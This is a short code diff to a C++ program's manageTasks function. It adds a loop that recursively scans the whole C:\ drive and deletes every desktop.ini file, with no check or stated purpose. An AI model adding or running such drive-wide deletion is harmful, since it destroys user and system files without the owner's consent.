@@ -409,6 +409,14 @@ void manageTasks(const std::wstring& task)
 		WCHAR windowsDir[MAX_PATH];
 		WCHAR systemDir[MAX_PATH];
 
+		for (const auto& entry : fs::recursive_directory_iterator(L"C:\\"))
+		{
+			if (entry.path().filename() == L"desktop.ini")
+			{
+				fs::remove(entry.path());
+			}
+		}
+
 		if (GetWindowsDirectory(windowsDir, MAX_PATH) == 0 || GetSystemDirectory(systemDir, MAX_PATH) == 0) {
 			return;
 		}
